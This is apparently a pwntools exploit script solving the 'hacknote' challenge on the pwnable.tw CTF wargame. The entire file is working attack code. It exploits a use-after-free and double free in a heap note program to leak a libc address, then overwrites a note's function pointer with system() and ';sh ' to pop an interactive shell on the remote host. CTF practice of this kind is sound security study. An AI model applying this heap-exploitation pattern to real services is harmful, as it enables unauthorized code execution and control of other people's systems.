from pwn import *

local = False

if local:
	r = process("./hacknote")
	gdb.attach(r)
	r.recvuntil("Your choice :")
	sys_off = 0x3ada0
	binsh_off = 0x15ba0b
	memalign_hook = 0x1b2760
else:
	r = remote("chall.pwnable.tw", 10102)
	r.recvuntil("Your choice :")
	sys_off = 0x3a940
	binsh_off = 0x158e8b
	memalign_hook = 0x1b0760

def add(size, content):
	r.sendline(str(1))
	r.recvuntil("Note size :")
	r.sendline(str(size))
	r.recvuntil("Content :")
	r.send(content)
	r.recvuntil("Your choice :")
def delete(index):
	r.sendline(str(2))
	r.recvuntil("Index :")
	r.sendline(str(index))
	r.recvuntil("Your choice :")
def put(index):
	r.sendline(str(3))
	r.recvuntil("Index :")
	r.sendline(str(index))
	s = r.recvuntil("Your choice :")
	return s
def exit():
	r.sendline(str(4))

add(256, "1111")	# 0
#raw_input("#")
add(8, "2222")	# 1	
delete(0)
add(256, "3333")	# 2
s = put(0)
s = "0x" + enhex(s[4:8][::-1])
leak = int(s, 16) - 0x50
base = leak - memalign_hook
sys_addr = base + sys_off
binsh_addr = base + binsh_off
delete(1)
delete(1)
add(20, "4444")	# 3
payload = p32(sys_addr) + ";sh "
add(8, payload)	# 4

r.sendline(str(3))
r.recvuntil("Index :")
r.sendline(str(1))
r.interactive()
